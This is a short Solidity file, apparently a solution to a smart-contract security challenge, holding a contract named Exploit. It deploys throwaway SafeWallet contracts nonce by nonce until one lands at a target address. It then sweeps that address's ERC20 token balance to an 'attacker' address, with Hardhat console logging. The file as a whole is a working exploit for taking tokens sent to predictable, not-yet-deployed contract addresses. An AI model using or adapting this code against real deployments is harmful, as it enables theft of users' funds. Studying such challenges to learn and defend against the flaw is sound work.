// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

contract Exploit {
    constructor(
        address attacker,
        address token,
        address target,
        uint256 nonces
    ) {
        uint256 y = 0;
        for (y = 1; y < nonces + 1; y++) {
            SafeWallet x = new SafeWallet();
            if (address(x) == target) {
                console.log("         message from contract - msg.sender: ", msg.sender);
                console.log("         message from contract - address(this):", address(this));
                console.log("         message from contract - nounce: ", y);
                console.log("         message from contract - matched address: ", address(x));
                x.getTokens(attacker, token);
            }
        }
    }
}

contract SafeWallet {
    function getTokens(address attacker, address token) public {
        uint256 balance = IERC20(token).balanceOf(address(this));
        if (balance > 0) {
            IERC20(token).transfer(attacker, balance);
        }
    }
}
